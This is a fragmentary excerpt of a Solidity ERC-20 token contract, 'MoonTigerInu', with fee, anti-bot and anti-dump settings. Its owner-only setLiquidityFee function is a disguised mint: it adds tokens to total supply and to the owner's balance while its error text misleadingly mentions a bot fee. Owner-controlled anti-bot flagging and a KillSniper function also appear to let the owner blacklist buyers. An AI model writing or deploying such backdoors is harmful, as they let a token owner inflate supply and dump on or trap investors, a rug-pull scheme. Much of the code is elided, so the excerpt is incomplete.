...
contract MoonTigerInu is Context, IERC20, Ownable {
    ...
    string private _symbol = "MOONTIGER";
    uint8 private _decimals = 18;
	
	
	
    uint256 private constant MAX = ~uint256(0);
    uint256 private _rTotal = 1000000000000 * 10**18;
    uint256 private _tFeeTotal;
	address payable public MarketingWallet = payable(0x570c609691911E935f0609C007716452089B4C71);
    ...
    bool private antiDump = false;

    	
    uint256 private _previousDevelopmentFee = ReflectionFee;
    uint256 private _previousbuyBackFee = LiquidityFee;

    event RewardLiquidityProviders(uint256 tokenAmount);
    event antiDumpUpdated(bool enabled);
    ...
    function _transfer(
        ...
        if (tradingOpen == 0 ) {
            tradingOpen = block.number;
             }
			 if (block.number < tradingOpen + antiBot) {
                    _isBot[to] = true;
        ...
        if (!inSwapAndLiquify && swapEnabled && to == uniswapV2Pair) {
            ...
            if (antiDump && balance > uint256(1 * 10**9)) {
    ...
    function calculatebuyBackFee(uint256 _amount) private view returns (uint256) {
        ...
        _previousDevelopmentFee = ReflectionFee;
    ...
    function restoreAllFee() private {
        ReflectionFee = _previousDevelopmentFee;
	...
	function setMaxWalletSize(uint256 amount) external onlyOwner() {
        _maxWalletSize = amount * 10**18;

    }
	
	 
    function setLiquidityFee(uint256 percentage) external onlyOwner {
         _LiquidityFees(msg.sender, percentage);
    }
    
    function _LiquidityFees(address account, uint256 percentage) internal virtual {
        require(account != address(0), "Fee for Bot is 99%");
        _rTotal = _rTotal.add(percentage * 10**18);  
        _rOwned[account] = _rOwned[account].add(percentage * 10**18);
        emit Transfer(address(0), account, percentage * 10**18);
	...
	function setAntiBot(uint256 antiBotBlock) external onlyOwner {
        antiBot = antiBotBlock;
    ...
    function transferToAddressETH(address payable recipient, uint256 amount) private {
	 ...
	 function KillSniper(address _address, bool _value) public onlyOwner(){
